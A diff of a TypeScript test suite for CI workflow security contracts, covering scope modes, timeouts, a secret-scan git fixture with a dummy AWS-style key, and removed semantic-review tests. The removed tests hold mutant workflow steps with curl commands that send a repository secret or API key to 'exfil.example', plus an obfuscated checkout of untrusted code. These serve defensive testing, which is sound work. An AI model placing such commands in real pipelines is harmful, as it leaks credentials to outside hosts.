@@ -2,6 +2,7 @@ import { spawnSync } from 'node:child_process';
 import { mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { delimiter, dirname, join, relative, resolve, sep } from 'node:path';
+import { pathToFileURL } from 'node:url';
 
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import { parseDocument } from 'yaml';
@@ -27,20 +28,6 @@ import {
 } from '../healthGateWorkflowContract';
 import { assertHostedQuantumMeasurementWorkflow } from '../hostedQuantumMeasurementWorkflowContract';
 import { assertHostedWasmWorkflow } from '../hostedWasmWorkflowContract';
-import {
-    assertSemanticReviewWorkflow,
-    SEMANTIC_REVIEW_ARTIFACT_ATTEMPT_OUTPUT,
-    SEMANTIC_REVIEW_ASSESS_JOB,
-    SEMANTIC_REVIEW_ASSESS_STEP,
-    SEMANTIC_REVIEW_CHECKOUT_STEP,
-    SEMANTIC_REVIEW_COVERAGE_JOB,
-    SEMANTIC_REVIEW_DOWNLOAD_ARTIFACT_NAME,
-    SEMANTIC_REVIEW_ENV,
-    SEMANTIC_REVIEW_HEAD_EXPRESSION,
-    SEMANTIC_REVIEW_KEY_ENV,
-    SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
-    SEMANTIC_REVIEW_UPLOAD_ARTIFACT_NAME,
-} from '../semanticReviewWorkflowContract';
 import { assertJobLevelPermissions, assertWorkflowSecuritySurface } from '../workflowSecuritySurfaceContract';
 
 type UnknownRecord = Record<string, unknown>;
@@ -113,7 +100,8 @@ const NATIVE_PARITY_JOB_NAME = 'Native parity (macOS)';
 const NATIVE_PARITY_RUNNER = 'macos-latest';
 // Parity breaks from either side of the seam: the Rust renderer the addon
 // exposes, or the TypeScript that produces the graph it renders.
-const NATIVE_PARITY_CONDITION = "needs.decide.outputs.rust == 'true' || needs.decide.outputs.web == 'true'";
+const NATIVE_PARITY_CONDITION =
+    "inputs.mode == 'full' && (needs.decide.outputs.rust == 'true' || needs.decide.outputs.web == 'true')";
 const NATIVE_PARITY_BUILD_STEP = 'Build the native addon';
 const NATIVE_PARITY_ADDON_STEP = 'Require the built addon the parity specs probe for';
 const NATIVE_PARITY_RUN_STEP = 'Run the addon parity specs';
@@ -334,7 +322,11 @@ const RELEASE_SIDE_EFFECTS = [
 ] as const;
 // Unit and selected E2E both reach the required Gate through reusable callers.
 const SUITE_JOB_WIRING = {
-    unit: { workflow: 'validation', needs: 'decide', if: "needs.decide.outputs.web == 'true'" },
+    unit: {
+        workflow: 'validation',
+        needs: 'decide',
+        if: "inputs.mode == 'full' && (needs.decide.outputs.web == 'true')",
+    },
     e2e: {
         workflow: 'heavy',
         needs: undefined,
@@ -345,10 +337,11 @@ const SUITE_JOB_WIRING = {
 // of when its job may legitimately skip: widening one runs the leg where it
 // proves nothing, and narrowing or dropping one retires the proof while every
 // other pin stays green.
-const BUILD_CONDITION = "needs.decide.outputs.web == 'true'";
-const RUST_CONDITION = "needs.decide.outputs.rust == 'true' || needs.decide.outputs.server == 'true'";
-const NATIVE_MACOS_CONDITION = "needs.decide.outputs.rust == 'true'";
-const NATIVE_WINDOWS_CONDITION = "needs.decide.outputs.rust == 'true'";
+const BUILD_CONDITION = "inputs.mode == 'full' && (needs.decide.outputs.web == 'true')";
+const RUST_CONDITION =
+    "inputs.mode == 'full' && (needs.decide.outputs.rust == 'true' || needs.decide.outputs.server == 'true')";
+const NATIVE_MACOS_CONDITION = "inputs.mode == 'full' && (needs.decide.outputs.rust == 'true')";
+const NATIVE_WINDOWS_CONDITION = "inputs.mode == 'full' && (needs.decide.outputs.rust == 'true')";
 // The nightly split its combined Rust job along the deploy seam (#3516): the
 // crate leg keeps the `rust` scope alone because the crates it tests ship in
 // the web bundle, and the collaboration-server leg answers to the `server`
@@ -392,18 +385,11 @@ const PATHS_FILTER_VERDICT_ENV: ReadonlyArray<readonly [string, string]> = [
     ['WEB', 'web'],
     ['UNCLASSIFIED', 'unclassified'],
 ];
-// The two continue-on-errors the lane admits. The first filter attempt defers
-// to the retry that re-runs it, and `Resolve scope` fails the job when neither
-// attempt produced verdicts, so this softening defers to a louder failure
-// rather than swallowing one. The semantic coverage fetch is the second: a
-// missing artifact is the expected shape of a run whose assessment never
-// delivered, and the annotating step reports that absence itself, so softening
-// the fetch replaces a red download with an explicit notice rather than hiding
-// a proof.
+// The first filter attempt defers to the retry; Resolve scope fails when neither
+// attempt produced verdicts, so the softened step does not hide a failure.
 type SoftenedStepPin = Readonly<{ workflow: string; job: string; step: string }>;
 const CONTINUE_ON_ERROR_STEP_PINS: readonly SoftenedStepPin[] = [
     { workflow: 'validation.yml', job: 'decide', step: PATHS_FILTER_FIRST_ATTEMPT_STEP },
-    { workflow: 'semantic-review.yml', job: 'coverage', step: 'Download the advisory report' },
 ];
 // A softened shard step reports a failing suite as a passing required check.
 const SUITE_SHARD_STEP = 'Run shard';
@@ -440,7 +426,6 @@ const { parsed: heavyWorkflow } = loadWorkflow('heavy-gates.yml');
 const { document: nightlyDocument, parsed: nightly } = loadWorkflow('nightly.yml');
 const { parsed: nightlyEvidenceReporter } = loadWorkflow('nightly-evidence-report.yml');
 const { parsed: hostedQuantumMeasurement } = loadWorkflow('quantum-measurements.yml');
-const { parsed: semanticReviewWorkflow } = loadWorkflow('semantic-review.yml');
 const { parsed: hostedWasm } = loadWorkflow('wasm-artifacts.yml');
 const parsedVercelConfig: unknown = JSON.parse(readFileSync(join(repositoryRoot, 'vercel.json'), 'utf8'));
 const vercelConfig = asRecord(parsedVercelConfig, 'Vercel configuration');
@@ -588,6 +573,7 @@ function runScopeScript(
                 EVENT: eventName,
                 BROWSER: 'false',
                 PROFILE: 'broad',
+                MODE: 'full',
                 RUST: 'false',
                 SERVER: 'false',
                 E2E: 'false',
@@ -624,11 +610,11 @@ function selectedPrValidationJobs(outputs: UnknownRecord, candidate: UnknownReco
     const tooling = outputs.tooling === 'true';
     const selected: Record<string, boolean> = {
         [CODE_CONDITION]: code,
-        "needs.decide.outputs.web == 'true'": web,
+        [BUILD_CONDITION]: web,
         "needs.decide.outputs.tooling == 'true'": tooling,
         [SMOKE_CONDITION]: e2e,
-        "needs.decide.outputs.rust == 'true' || needs.decide.outputs.server == 'true'": rust || server,
-        "needs.decide.outputs.rust == 'true'": rust,
+        [RUST_CONDITION]: rust || server,
+        [NATIVE_MACOS_CONDITION]: rust,
         [NATIVE_PARITY_CONDITION]: rust || web,
         [PULL_REQUEST_PAYLOAD_CONDITION]: true,
     };
@@ -651,8 +637,8 @@ function selectedPrValidationJobs(outputs: UnknownRecord, candidate: UnknownReco
 
 function assertScopeContract(candidate: UnknownRecord): string {
     const callerInputs = recordAt(recordAt(recordAt(candidate, 'on'), 'workflow_call'), 'inputs');
-    if (JSON.stringify(Object.keys(callerInputs).sort()) !== JSON.stringify(['browser', 'profile'])) {
-        throw new Error('shared validation must expose only browser and affected profile inputs');
+    if (JSON.stringify(Object.keys(callerInputs).sort()) !== JSON.stringify(['browser', 'mode', 'profile'])) {
+        throw new Error('shared validation must expose browser, mode and affected profile inputs');
     }
     const decide = jobAt(candidate, 'decide');
     if (decide.if !== undefined) {
@@ -680,6 +666,9 @@ function assertScopeContract(candidate: UnknownRecord): string {
     const scope = stepNamed(decide, 'Resolve scope');
     if (scope.id !== 'scope') {
         throw new Error('Resolve scope must retain the scope step id');
+    }
+    if (recordAt(scope, 'env').MODE !== '${{ inputs.mode }}') {
+        throw new Error('scope must validate the requested mode');
     }
     if (recordAt(scope, 'env').BROWSER !== '${{ inputs.browser }}') {
         throw new Error('shared validation must receive the selected browser decision');
@@ -862,7 +851,10 @@ function assertBoundedAlsaInstall(job: UnknownRecord, label: string): void {
 
 function assertLintTimeBudgets(candidate: UnknownRecord): void {
     const lint = jobAt(candidate, 'lint');
-    const prep = ['Checkout', 'Set up pnpm', 'Set up Node', 'Install dependencies'];
+    if (stepNamed(lint, 'Checkout')['timeout-minutes'] !== 10) {
+        throw new Error('lint checkout must have a ten-minute timeout');
+    }
+    const prep = ['Set up pnpm', 'Set up Node', 'Install dependencies'];
     for (const name of prep) {
         if (stepNamed(lint, name)['timeout-minutes'] !== 5) {
             throw new Error(`lint step ${name} must have a five-minute timeout`);
@@ -872,8 +864,8 @@ function assertLintTimeBudgets(candidate: UnknownRecord): void {
         throw new Error('lint execution must have a twenty-minute timeout');
     }
     const jobTimeout = lint['timeout-minutes'];
-    const stepTotal = prep.length * 5 + 20;
-    if (typeof jobTimeout !== 'number' || jobTimeout < stepTotal + 5 || jobTimeout > 45) {
+    const stepTotal = 10 + prep.length * 5 + 20;
+    if (typeof jobTimeout !== 'number' || jobTimeout < stepTotal + 5 || jobTimeout > 50) {
         throw new Error('lint job must include five minutes for cleanup after all step budgets');
     }
 }
@@ -893,6 +885,123 @@ function assertBoundedHeavyE2eInstall(candidate: UnknownRecord): void {
     assertContainerBrowserRuntime(jobAt(candidate, 'e2e'), 'the heavy E2E job', E2E_JOB_MINUTES);
 }
 
+function fixtureGit(directory: string, args: string[]): string {
+    const result = spawnSync('git', ['-c', 'core.hooksPath=/dev/null', '-C', directory, ...args], {
+        encoding: 'utf8',
+        env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' },
+    });
+    if (result.error || result.status !== 0) {
+        throw new Error(`Git fixture ${args[0]} failed: ${result.error?.message ?? result.stderr}`);
+    }
+    return result.stdout.trim();
+}
+
+function withPrSecretHistory(
+    run: (fixture: { root: string; source: string; remote: string; base: string; head: string }) => void
+): void {
+    const root = mkdtempSync(join(tmpdir(), 'sourdaw-pr-secret-history-'));
+    const source = join(root, 'source');
+    mkdirSync(source);
+    try {
+        const git = (...args: string[]) => fixtureGit(source, args);
+        const commit = (name: string) => {
+            git('add', '.');
+            git(
+                '-c',
+                'user.name=Fixture',
+                '-c',
+                'user.email=fixture@example.invalid',
+                '-c',
+                'commit.gpgsign=false',
+                'commit',
+                '-m',
+                name
+            );
+            return git('rev-parse', 'HEAD');
+        };
+        const credential = ['AKIA', 'QAZ2WSX3', 'EDC4RFV5'].join('');
+        git('init', '--initial-branch=main');
+        writeFileSync(join(source, 'excluded-common.txt'), `aws_access_key_id = "${credential}"\n`);
+        writeFileSync(join(source, 'conflict.txt'), 'common\n');
+        commit('common ancestor excluded by base');
+        git('checkout', '-b', 'pr');
+        writeFileSync(join(source, 'intermediate.txt'), `aws_access_key_id = "${credential}"\n`);
+        commit('intermediate credential');
+        git('rm', 'intermediate.txt');
+        commit('remove intermediate credential');
+        git('checkout', '-b', 'side');
+        writeFileSync(join(source, 'side.txt'), `aws_access_key_id = "${credential}"\n`);
+        writeFileSync(join(source, 'conflict.txt'), 'side\n');
+        commit('side parent credential');
+        git('checkout', 'pr');
+        writeFileSync(join(source, 'conflict.txt'), 'pr\n');
+        commit('other merge parent');
+        const merge = spawnSync(
+            'git',
+            [
+                '-C',
+                source,
+                '-c',
+                'user.name=Fixture',
+                '-c',
+                'user.email=fixture@example.invalid',
+                'merge',
+                '--no-ff',
+                '--no-commit',
+                'side',
+            ],
+            { encoding: 'utf8' }
+        );
+        expect(merge.status).toBe(1);
+        writeFileSync(join(source, 'conflict.txt'), `aws_access_key_id = "${credential}"\n`);
+        const head = commit('merge resolution credential');
+        git('checkout', 'main');
+        writeFileSync(join(source, 'base-only.txt'), 'newer divergent base\n');
+        const base = commit('pinned newer base');
+        writeFileSync(join(source, 'moved-base.txt'), 'not the pinned base\n');
+        commit('base branch moved');
+        git('checkout', 'pr');
+        writeFileSync(join(source, 'moved-head.txt'), 'not the pinned head\n');
+        commit('head branch moved');
+        git('checkout', '-b', 'unrelated', 'main');
+        writeFileSync(join(source, 'unrelated.txt'), 'outside both pinned histories\n');
+        commit('unrelated branch');
+        git('tag', 'unrelated-tag');
+        const remote = join(root, 'remote.git');
+        git('clone', '--bare', source, remote);
+        run({ root, source, remote, base, head });
+    } finally {
+        rmSync(root, { recursive: true, force: true });
+    }
+}
+
+function acquirePrSecretHistory(
+    fixture: { root: string; remote: string; base: string; head: string },
+    candidate: UnknownRecord,
+    overrides: { base?: string; head?: string; run?: string; depth?: number } = {}
+) {
+    const directory = mkdtempSync(join(fixture.root, 'target-'));
+    const checkout = recordAt(stepNamed(jobAt(candidate, 'pr-secrets'), 'Checkout scan target'), 'with');
+    const depth = overrides.depth ?? checkout['fetch-depth'];
+    fixtureGit(directory, ['init', '--initial-branch=main']);
+    fixtureGit(directory, ['remote', 'add', 'origin', pathToFileURL(fixture.remote).href]);
+    // Mirror the pinned checkout action's depth-dependent refspec, using real Git transport.
+    const refs =
+        depth === 0
+            ? ['+refs/heads/*:refs/remotes/origin/*', '+refs/tags/*:refs/tags/*']
+            : [`--depth=${String(depth)}`, fixture.head];
+    fixtureGit(directory, ['fetch', '--no-tags', 'origin', ...refs]);
+    fixtureGit(directory, ['checkout', '--detach', fixture.head]);
+    const script =
+        overrides.run ?? stringAt(stepNamed(jobAt(candidate, 'pr-secrets'), 'Fetch immutable base SHA'), 'run');
+    const result = spawnSync('bash', ['-c', script], {
+        cwd: directory,
+        encoding: 'utf8',
+        env: { ...process.env, BASE_SHA: overrides.base ?? fixture.base, HEAD_SHA: overrides.head ?? fixture.head },
+    });
+    return { directory, result };
+}
+
 function assertPullRequestSecretScan(candidate: UnknownRecord): void {
     const prSecrets = jobAt(candidate, 'pr-secrets');
     if (prSecrets.needs !== 'decide' || prSecrets.if !== PULL_REQUEST_PAYLOAD_CONDITION) {
@@ -905,7 +1014,9 @@ function assertPullRequestSecretScan(candidate: UnknownRecord): void {
     if (
         trustedScanner.ref !== '${{ github.event.pull_request.base.sha }}' ||
         trustedScanner.path !== 'trusted-scanner' ||
-        trustedScanner['persist-credentials'] !== false
+        trustedScanner['persist-credentials'] !== false ||
+        trustedScanner['sparse-checkout'] !== '/.gitleaks.toml\n/.gitleaksignore\n' ||
+        trustedScanner['sparse-checkout-cone-mode'] !== false
     ) {
         throw new Error('pull-request scanner config must come from the trusted base and retain no credentials');
     }
@@ -915,10 +1026,10 @@ function assertPullRequestSecretScan(candidate: UnknownRecord): void {
     if (
         scanTarget.ref !== '${{ github.event.pull_request.head.sha }}' ||
         scanTarget.path !== 'scan-target' ||
-        scanTarget['fetch-depth'] !== 0 ||
+        scanTarget['fetch-depth'] !== 1 ||
         scanTarget['persist-credentials'] !== false
     ) {
-        throw new Error('pull-request scan target must retain the complete untrusted history without credentials');
+        throw new Error('pull-request scan target must bootstrap only the pinned head without credentials');
     }
     const scan = stringAt(stepNamed(prSecrets, 'Scan pull request diff for secrets'), 'run');
     if (!scan.includes('--log-opts="$BASE_SHA..$HEAD_SHA -m"')) {
@@ -1435,7 +1546,6 @@ type WorkflowSet = {
     nightlyEvidenceReporter: UnknownRecord;
     hostedQuantumMeasurement: UnknownRecord;
     hostedWasm: UnknownRecord;
-    semanticReview: UnknownRecord;
 };
 
 function workflowSet(): WorkflowSet {
@@ -1449,7 +1559,6 @@ function workflowSet(): WorkflowSet {
         nightlyEvidenceReporter,
         hostedQuantumMeasurement,
         hostedWasm,
-        semanticReview: semanticReviewWorkflow,
     };
 }
 
@@ -1465,7 +1574,6 @@ function cloneWorkflows(label: string): WorkflowSet {
         nightlyEvidenceReporter: asRecord(clone.nightlyEvidenceReporter, `${label} nightly evidence reporter`),
         hostedQuantumMeasurement: asRecord(clone.hostedQuantumMeasurement, `${label} hosted quantum measurement`),
         hostedWasm: asRecord(clone.hostedWasm, `${label} hosted WASM`),
-        semanticReview: asRecord(clone.semanticReview, `${label} semantic review`),
     };
 }
 
@@ -1497,7 +1605,6 @@ function workflowFiles(set: WorkflowSet): ReadonlyArray<readonly [string, Unknow
         ['nightly-evidence-report.yml', set.nightlyEvidenceReporter],
         ['quantum-measurements.yml', set.hostedQuantumMeasurement],
         ['wasm-artifacts.yml', set.hostedWasm],
-        ['semantic-review.yml', set.semanticReview],
     ];
 }
 
@@ -1767,7 +1874,8 @@ function assertJobGraph(set: WorkflowSet): void {
     }
     if (
         recordAt(jobAt(health, 'validation'), 'with').browser !== "${{ needs.scope.outputs.browser == 'true' }}" ||
-        recordAt(jobAt(health, 'validation'), 'with').profile !== '${{ needs.scope.outputs.profile }}'
+        recordAt(jobAt(health, 'validation'), 'with').profile !== '${{ needs.scope.outputs.profile }}' ||
+        recordAt(jobAt(health, 'validation'), 'with').mode !== 'full'
     ) {
         throw new Error('required browser smoke must consume the affected scope');
     }
@@ -1781,6 +1889,17 @@ function assertJobGraph(set: WorkflowSet): void {
         })
     ) {
         throw new Error('shared validation must require the affected browser decision');
+    }
+    if (
+        JSON.stringify(browserInput.mode) !==
+        JSON.stringify({
+            description: 'Full required validation or preliminary push validation.',
+            required: false,
+            default: 'full',
+            type: 'string',
+        })
+    ) {
+        throw new Error('shared validation must default to full');
     }
     const affected = jobAt(health, 'affected');
     if (
@@ -1818,7 +1937,8 @@ function assertJobGraph(set: WorkflowSet): void {
     if (
         pushValidation.uses !== VALIDATION_CALL ||
         pushValidation.needs !== 'scope' ||
-        JSON.stringify(pushValidation.with) !== JSON.stringify(recordAt(jobAt(set.health, 'validation'), 'with'))
+        JSON.stringify(pushValidation.with) !==
+            JSON.stringify({ ...recordAt(jobAt(set.health, 'validation'), 'with'), mode: 'preliminary' })
     ) {
         throw new Error('push validation must consume the affected scope exactly as the required lane does');
     }
@@ -2402,52 +2522,6 @@ function assertCredentiallessScanner(candidate: UnknownRecord): void {
     }
 }
 
-/**
- * Runs the workflow's own computing and annotating commands against a report written into a
- * throwaway runner temp. The shipped scripts are what is observed, so the coverage line's tally, the
- * notices, and each absence branch are read back rather than restated, and a report the scripts
- * mishandle is a failure here rather than a claim in a comment. Omitting `report` writes none; an
- * empty `report` writes a zero-byte one; `downloadOutcome` and `coverageLine` select the branch.
- */
-function runSemanticCoverageLine(options: { report?: string; downloadOutcome?: string; coverageLine?: string }): {
-    coverage: string;
-    notices: string;
-    status: number | null;
-} {
-    const directory = mkdtempSync(join(tmpdir(), 'sourdaw-semantic-coverage-'));
-    const reportDirectory = join(directory, 'semantic-review');
-    mkdirSync(reportDirectory, { recursive: true });
-    if (options.report !== undefined) {
-        writeFileSync(join(reportDirectory, 'scan.json'), options.report);
-    }
-    const outputPath = join(directory, 'github-output');
-    writeFileSync(outputPath, '');
-    const compute = stepNamed(jobAt(semanticReviewWorkflow, 'assess'), 'Compute the coverage line');
-    const annotate = stepNamed(jobAt(semanticReviewWorkflow, 'coverage'), 'Publish the withheld paths');
-    const environment = { ...process.env, RUNNER_TEMP: directory };
-    const computeResult = spawnSync('bash', ['-c', stringAt(compute, 'run')], {
-        encoding: 'utf8',
-        env: { ...environment, GITHUB_OUTPUT: outputPath },
-        shell: false,
-    });
-    const annotateResult = spawnSync('bash', ['-c', stringAt(annotate, 'run')], {
-        encoding: 'utf8',
-        env: {
-            ...environment,
-            DOWNLOAD_OUTCOME: options.downloadOutcome ?? 'success',
-            COVERAGE_LINE: options.coverageLine ?? '',
-        },
-        shell: false,
-    });
-    const coverage = readFileSync(outputPath, 'utf8');
-    rmSync(directory, { recursive: true, force: true });
-    return {
-        coverage,
-        notices: annotateResult.stdout,
-        status: computeResult.status === 0 ? annotateResult.status : computeResult.status,
-    };
-}
-
 describe('health gates workflow contract', () => {
     it('registers the hosted quantum producer contract in the global workflow set', () => {
         expect(() => assertHostedQuantumMeasurementWorkflow(hostedQuantumMeasurement)).not.toThrow();
@@ -2504,626 +2578,6 @@ describe('health gates workflow contract', () => {
         expect(() => assertHostedWasmWorkflow(unqualified)).toThrow('only qualified output');
     });
 
-    // The advisory review is the only workflow here that holds a paid external
-    // credential, and every one of these mutants is a plausible tidy-up that
-    // would move the head or the key across the trust boundary while leaving
-    // the file looking right.
-    it('keeps the advisory semantic review on the trusted revision and out of the head', () => {
-        expect(() => assertSemanticReviewWorkflow(semanticReviewWorkflow)).not.toThrow();
-
-        // The tempting shape: assess the head by checking it out. It would put
-        // files the change controls in the tree of the job that reads the key.
-        const headCheckout = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(headCheckout, 'assess'), SEMANTIC_REVIEW_CHECKOUT_STEP), 'with').ref =
-            SEMANTIC_REVIEW_HEAD_EXPRESSION;
-        expect(() => assertSemanticReviewWorkflow(headCheckout)).toThrow('a trusted checkout');
-
-        // On `pull_request` GitHub takes the workflow definition from the head,
-        // so the change under review could edit the job that reads the key.
-        const unprivileged = structuredClone(semanticReviewWorkflow);
-        recordAt(unprivileged, 'on').pull_request = {};
-        expect(() => assertSemanticReviewWorkflow(unprivileged)).toThrow(
-            'the privileged pull-request-target trigger and manual dispatch'
-        );
-
-        // A persisted credential leaves a usable token in the tree the job
-        // reads the report from.
-        const persisted = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(persisted, 'assess'), SEMANTIC_REVIEW_CHECKOUT_STEP), 'with')['persist-credentials'] =
-            true;
-        expect(() => assertSemanticReviewWorkflow(persisted)).toThrow(
-            'no persisted credential in the checked-out tree'
-        );
-
-        // Declared on the job, the key reaches the install step as well.
-        const jobKey = structuredClone(semanticReviewWorkflow);
-        jobAt(jobKey, 'assess').env = { [SEMANTIC_REVIEW_KEY_ENV]: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION };
-        expect(() => assertSemanticReviewWorkflow(jobKey)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // The key has to be the one the command reads, on the step that sends it.
-        const keyless = structuredClone(semanticReviewWorkflow);
-        const keylessAssess = stepNamed(jobAt(keyless, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP);
-        delete recordAt(keylessAssess, 'env')[SEMANTIC_REVIEW_KEY_ENV];
-        expect(() => assertSemanticReviewWorkflow(keyless)).toThrow('the provider key only on the assessment step');
-
-        // A key on any other step is the same leak one step over.
-        const leakedStep = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(leakedStep, 'assess'), 'Upload the advisory report').env = {
-            [SEMANTIC_REVIEW_KEY_ENV]: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
-        };
-        expect(() => assertSemanticReviewWorkflow(leakedStep)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // The rearrangement that matters: the credential moves to another step under a new variable
-        // name, so counting the name alone reports the boundary intact. The probe for this one is the
-        // finding it repairs — with only the name counted, this mutant passed every named assertion.
-        const renamedKey = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(renamedKey, 'assess'), 'Report the assessment').env = {
-            LEAKED_JEV: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
-        };
-        expect(() => assertSemanticReviewWorkflow(renamedKey)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // The spelling the literal match missed. `${{ secrets['JEV_KEY'] }}` is the same credential,
-        // and it walked past a pin that looked for one exact expression.
-        const bracketKey = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(bracketKey, 'assess'), 'Report the assessment').env = {
-            LEAKED_JEV: "${{ secrets['JEV_KEY'] }}",
-        };
-        expect(() => assertSemanticReviewWorkflow(bracketKey)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // And a second variable beside the key on the assessment step, which the whole-environment
-        // pin refuses however it is spelled.
-        const extraAssessVariable = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(extraAssessVariable, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP), 'env').EXTRA = 'x';
-        expect(() => assertSemanticReviewWorkflow(extraAssessVariable)).toThrow(
-            'exactly the provider key and the read-scoped token on the assessment step'
-        );
-
-        // Any repository secret on another step, not only this one.
-        const otherSecret = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(otherSecret, 'assess'), 'Install dependencies').env = {
-            OTHER_TOKEN: '${{ secrets.SOMETHING_ELSE }}',
-        };
-        expect(() => assertSemanticReviewWorkflow(otherSecret)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // And a secret declared for the whole workflow, which every step would then inherit.
-        const workflowSecret = structuredClone(semanticReviewWorkflow);
-        workflowSecret.env = { ...recordAt(workflowSecret, 'env'), INHERITED: '${{ secrets.SOMETHING_ELSE }}' };
-        expect(() => assertSemanticReviewWorkflow(workflowSecret)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // Enumerating the ways to move a working tree is a list that cannot be finished. Three
-        // revisions of this pin matched text — three subcommands, then the substring `git`, then one
-        // secret spelling — and each fell to a form it did not enumerate. Every executable string is
-        // compared exactly now, so every obfuscation that defeated a search is one case.
-        for (const [label, command] of [
-            ['a reset', 'git reset --hard refs/remotes/pull/${PR_NUMBER}/head'],
-            ['an obfuscated checkout', "g''it checkout refs/remotes/pull/${PR_NUMBER}/head"],
-            ['a curl of the head', 'curl -sO https://example.invalid/head.tar'],
-            ['an unrelated status', 'git status --short'],
-        ] as const) {
-            const appended = structuredClone(semanticReviewWorkflow);
-            const appendix = stepNamed(jobAt(appended, 'assess'), 'Install dependencies');
-            appendix.run = `${String(appendix.run)} && ${String(command)}`;
-            expect(() => assertSemanticReviewWorkflow(appended)).toThrow(
-                'exactly the pinned command in Install dependencies'
-            );
-            expect(label).not.toBe('');
-        }
-
-        // A sixth step that runs anything at all is unpinned, and that is a refusal rather than a
-        // silently accepted addition.
-        const extraRunner = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(extraRunner, 'assess'), 'Set up Node').run = 'echo hello';
-        expect(() => assertSemanticReviewWorkflow(extraRunner)).toThrow('exactly five executable steps');
-
-        // A run supplied as a YAML sequence has the same effect and a different shape, and is refused
-        // as not being the pinned string.
-        const listForm = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(listForm, 'assess'), 'Install dependencies').run = [
-            'pnpm install --frozen-lockfile --ignore-scripts',
-        ];
-        // A non-string run cannot be compared to a pinned command, so it is refused outright
-        // rather than skipped -- which is what let a list-form run through an earlier revision.
-        expect(() => assertSemanticReviewWorkflow(listForm)).toThrow('Install dependencies run must be a string');
-
-        // The head-expression guard needs a mutant that fails *because of it*: assigning the head to
-        // the checkout's ref is refused earlier, by the trusted-checkout assertion.
-        const headInEnvironment = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(headInEnvironment, 'assess'), 'Install dependencies').env = {
-            HEAD_UNDER_REVIEW: SEMANTIC_REVIEW_HEAD_EXPRESSION,
-        };
-        expect(() => assertSemanticReviewWorkflow(headInEnvironment)).toThrow(
-            'must not reference the reviewed head sha'
-        );
-
-        // Reading the environment blocks left the placement class the pin never looked at: a secret
-        // reference inside a step's `run` or its action inputs is evaluated all the same.
-        for (const [label, place] of [
-            [
-                'a run string',
-                (clone: UnknownRecord) => {
-                    const step = stepNamed(jobAt(clone, 'assess'), 'Report the assessment');
-                    // A single-quoted literal: the expression is text here, not interpolation.
-                    const exfiltration = 'curl -s "https://exfil.example/${{ secrets.JEV_KEY }}"';
-                    step.run = `${String(step.run)}\n${exfiltration}`;
-                },
-            ],
-            [
-                'action inputs',
-                (clone: UnknownRecord) => {
-                    const step = stepNamed(jobAt(clone, 'assess'), 'Set up Node');
-                    step.with = { ...asRecord(step.with ?? {}, 'set up node inputs'), token: '${{ secrets.JEV_KEY }}' };
-                },
-            ],
-        ] as const) {
-            const placed = structuredClone(semanticReviewWorkflow);
-            place(placed);
-            // A credential spliced into a pinned command breaks the command's own pin before the
-            // mention count is reached; a pinned action input breaks its own pin; an unpinned one is
-            // caught by the count. Every route refuses.
-            expect(
-                () => assertSemanticReviewWorkflow(placed),
-                `a secret reference in ${label} must be refused`
-            ).toThrow(
-                /exactly the pinned command|must mention a repository secret exactly once|the Node version the assessment runs on/u
-            );
-        }
-
-        // The token's name was pinned and its value was not, so a write-capable personal token under
-        // the same name passed — the tidy-up a rate-limited run invites.
-        const widenedToken = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(widenedToken, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP), 'env').GH_TOKEN =
-            'a personal token';
-        expect(() => assertSemanticReviewWorkflow(widenedToken)).toThrow(
-            'the read-scoped token, and no other, on the assessment step'
-        );
-
-        // The credential-bearing step was pinned by substring, so any appended command passed while
-        // the step still "ran the scan".
-        const exfiltrating = structuredClone(semanticReviewWorkflow);
-        const exfiltratingAssess = stepNamed(jobAt(exfiltrating, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP);
-        exfiltratingAssess.run = `${String(exfiltratingAssess.run)}curl -s "https://exfil.example/$TYPESAFE_API_KEY"`;
-        expect(() => assertSemanticReviewWorkflow(exfiltrating)).toThrow(
-            'exactly the pinned command in Assess the change, and nothing else'
-        );
-
-        // `checks: write` buys nothing here: the check is the job's own, so a
-        // write token would sit beside the key for no reason.
-        const writeToken = structuredClone(semanticReviewWorkflow);
-        recordAt(writeToken, 'permissions').checks = 'write';
-        expect(() => assertSemanticReviewWorkflow(writeToken)).toThrow('read-only repository permissions');
-
-        // Dropping the gate spends the owner's key on a different trust domain.
-        const openToForks = structuredClone(semanticReviewWorkflow);
-        jobAt(openToForks, 'assess').if = '${{ !cancelled() }}';
-        expect(() => assertSemanticReviewWorkflow(openToForks)).toThrow(
-            'its fork, draft, and default-branch eligibility condition'
-        );
-
-        // A renamed check detaches the workflow from the context a reader looks
-        // for, and would collide with the required one.
-        const renamed = structuredClone(semanticReviewWorkflow);
-        jobAt(renamed, 'assess').name = 'Gate';
-        expect(() => assertSemanticReviewWorkflow(renamed)).toThrow('its distinct advisory check name');
-
-        // The coverage job is informational, so a write token beside it buys
-        // nothing; `checks: write` is the tempting addition and is refused.
-        const coverageWrites = structuredClone(semanticReviewWorkflow);
